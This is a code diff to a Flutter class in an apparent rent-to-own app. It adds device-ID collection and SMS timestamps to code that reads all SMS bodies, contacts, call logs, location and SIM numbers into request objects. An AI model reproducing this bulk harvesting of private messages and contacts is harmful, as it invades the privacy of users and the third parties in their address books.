@@ -1,4 +1,5 @@
 import 'dart:io';
+import 'package:android_id/android_id.dart';
 import 'package:call_log/call_log.dart';
 import 'package:device_info_plus/device_info_plus.dart';
 import 'package:fast_contacts/fast_contacts.dart';
@@ -6,7 +7,7 @@ import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
 import 'package:geolocator/geolocator.dart';
 import 'package:mobile_number/mobile_number.dart';
 import 'package:rent2ownwelcomeapp/src/core/core.dart';
-
+import 'package:flutter/services.dart';
 
 class AppDeviceInfo {
   // - IMEI - //
@@ -18,6 +19,29 @@ class AppDeviceInfo {
       imei = '${androidInfo.id} | ${androidInfo.brand} | ${androidInfo.model}';
     }
     return imei!;
+  }
+
+  Future<String> getAndroidId() async {
+    String? androidId; // Initialize the variable
+
+    DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
+    try {
+      if (Platform.isAndroid) {
+        // var build = await deviceInfoPlugin.androidInfo;
+        // androidId = build.androidId.toString();
+        var androidIdPlugin = const AndroidId();
+        androidId = await androidIdPlugin.getId(); // Get the Android ID
+      } else if (Platform.isIOS) {
+        var data = await deviceInfoPlugin.iosInfo;
+        androidId = data.identifierForVendor.toString();
+        ; // On iOS, you can get the identifierForVendor as a unique ID
+      }
+    } on PlatformException {
+      // Handle any exceptions, such as permission errors or unavailable data
+      androidId = "Unknown"; // Set a default value in case of error
+    }
+
+    return androidId!; // Return only the Android ID
   }
 
   // - CALL LOGS - //
@@ -40,50 +64,54 @@ class AppDeviceInfo {
   // - SMS LOGS - //
   Future<List<SmsLogRequest>> getSmsLogs() async {
     List<SmsLogRequest> smsLogs = [];
-    
-    List<SmsMessage> smsMessages = await SmsQuery().getAllSms;
-     for (SmsMessage item in smsMessages) {
 
-       if (item.kind == SmsMessageKind.sent) {
+    List<SmsMessage> smsMessages = await SmsQuery().getAllSms;
+    for (SmsMessage item in smsMessages) {
+      int dateTimestamp = item.date?.millisecondsSinceEpoch ?? 0;
+
+      if (item.kind == SmsMessageKind.sent) {
         SmsLogRequest smsLog = SmsLogRequest(
             status: "SENT",
             sender: "",
             receiver: '${item.sender!}',
-            message: item.body!);
-         smsLogs.add(smsLog);
+            message: item.body!,
+            date: dateTimestamp);
+        smsLogs.add(smsLog);
       } else {
         SmsLogRequest smsLog = SmsLogRequest(
             status: "RECEIVED",
             sender: '${item.sender!}',
             receiver: "",
-            message: item.body!);
+            message: item.body!,
+            date: dateTimestamp);
         smsLogs.add(smsLog);
       }
-    };
+    }
+    ;
     return smsLogs;
   }
 
   // - CONTACTS - //
   Future<List<ContactRequest>> getContacts() async {
     List<ContactRequest> diContacts = [];
-     List<Contact>  contacts = await FastContacts.getAllContacts();
-  
-      for (Contact contact in contacts) {
-        if (contact.phones.isNotEmpty) {
-          var phones = contact.phones.map((e) => e.number).join(', ');
-          final emails = contact.emails.map((e) => e.address).join(', ');
-          final name = contact.structuredName;
+    List<Contact> contacts = await FastContacts.getAllContacts();
 
-          ContactRequest storeConst = ContactRequest(
-            displayName: contact.displayName,
-            firstName: name!.namePrefix,
-            lastName: name.nameSuffix,
-            phoneNo: phones,
-            email: emails,
-          );
-          diContacts.add(storeConst);
-        }
+    for (Contact contact in contacts) {
+      if (contact.phones.isNotEmpty) {
+        var phones = contact.phones.map((e) => e.number).join(', ');
+        final emails = contact.emails.map((e) => e.address).join(', ');
+        final name = contact.structuredName;
+
+        ContactRequest storeConst = ContactRequest(
+          displayName: contact.displayName,
+          firstName: name!.namePrefix,
+          lastName: name.nameSuffix,
+          phoneNo: phones,
+          email: emails,
+        );
+        diContacts.add(storeConst);
       }
+    }
     return diContacts;
   }
 
@@ -92,7 +120,7 @@ class AppDeviceInfo {
     final position = await GeolocatorPlatform.instance.getCurrentPosition();
 
     LiveLocationRequest liveLocation = LiveLocationRequest(
-         latitude: position.latitude.toString(),
+        latitude: position.latitude.toString(),
         longitude: position.longitude.toString());
     return liveLocation;
   }
@@ -104,8 +132,8 @@ class AppDeviceInfo {
     String? simCard_1 = simCards!.length == 1 ? simCards[0].number : null;
     String? simCard_2 = simCards.length == 2 ? simCards[1].number : null;
 
-    DeviceSimRequest simCard =
-        DeviceSimRequest(simCardNo1: phoneNo , simCardNo2: simCard_1?? simCard_2??"" );
+    DeviceSimRequest simCard = DeviceSimRequest(
+        simCardNo1: phoneNo, simCardNo2: simCard_1 ?? simCard_2 ?? "");
     return simCard;
   }
 
